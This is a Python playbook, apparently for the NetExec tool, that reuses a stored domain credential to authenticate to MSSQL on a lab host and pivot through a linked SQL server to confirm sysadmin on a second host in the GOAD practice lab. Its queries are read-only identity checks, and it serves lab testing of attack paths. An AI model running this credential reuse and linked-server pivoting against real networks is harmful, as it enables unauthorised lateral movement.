"""Follow Jon's stored credential from Winterfell to both GOAD SQL servers.

Start at 10.60.0.11 with Jon's credentials and declare 10.60.0.22 and 10.60.0.23
using --allow-target. All SQL batches are SELECTs. The reached privilege is SQL
sysadmin; this does not establish Windows administrator or domain control.
"""

from dataclasses import dataclass, field

from nxc.playbooks.results import CredentialRef


@dataclass
class SQLPathEvidence:
    source_credential: CredentialRef | None = None
    sql_credential: CredentialRef | None = None
    local_identity: dict = field(default_factory=dict)
    linked_identity: dict = field(default_factory=dict)
    evidence_indices: list[int] = field(default_factory=list)
    reached: bool = False
    privilege: str = "SQL sysadmin"
    reason: str | None = None


IDENTITY = "SELECT @@SERVERNAME AS server_name, CAST(SERVERPROPERTY('MachineName') AS nvarchar(128)) AS machine_name, ORIGINAL_LOGIN() AS original_login, SUSER_SNAME() AS effective_login, IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin"


def run(host):
    if host.target != "10.60.0.11":
        raise ValueError("Start this GOAD path on Winterfell at 10.60.0.11")
    # Resolve allowed contexts before opening a connection, including the known
    # destination of the configured linked server. at() itself does no I/O.
    castelblack = host.at("10.60.0.22")
    braavos = host.at("10.60.0.23")
    data = SQLPathEvidence()

    with host.evidence() as steps:

        def finish(reason=None):
            data.reason = reason
            data.evidence_indices = list(steps.indices)
            return host.finding("goad_cross_host_sql", ok=data.reached, data=data, inputs={"sql_host": castelblack.target, "linked_host": braavos.target})

        ldap = host.ldap()
        if not ldap.authenticated:
            return finish("Initial directory authentication was not established")
        data.source_credential = ldap.credential
        if data.source_credential is None:
            return finish("Initial authentication has no reusable database credential reference")

        sql = castelblack.mssql(credential=data.source_credential)
        if not sql.authenticated:
            return finish("Stored credential did not establish SQL authentication on Castelblack")
        data.sql_credential = sql.credential

        data.local_identity = sql.query(query=IDENTITY).one()
        if str(data.local_identity.get("machine_name")).upper() != "CASTELBLACK" or data.local_identity.get("is_sysadmin") != 1:
            return finish("Castelblack SQL sysadmin prerequisite was not observed")

        links = sql.module("enum_links")
        if not any(row["SRV_NAME"].upper() == "BRAAVOS" for row in links.data.servers):
            return finish("Configured BRAAVOS SQL link was not found")

        data.linked_identity = sql.module("exec_on_link", linked_server="BRAAVOS", command=IDENTITY).one()
        data.reached = str(data.linked_identity.get("machine_name")).upper() == "BRAAVOS" and data.linked_identity.get("is_sysadmin") == 1
        return finish(None if data.reached else "Linked query did not observe Braavos SQL sysadmin")
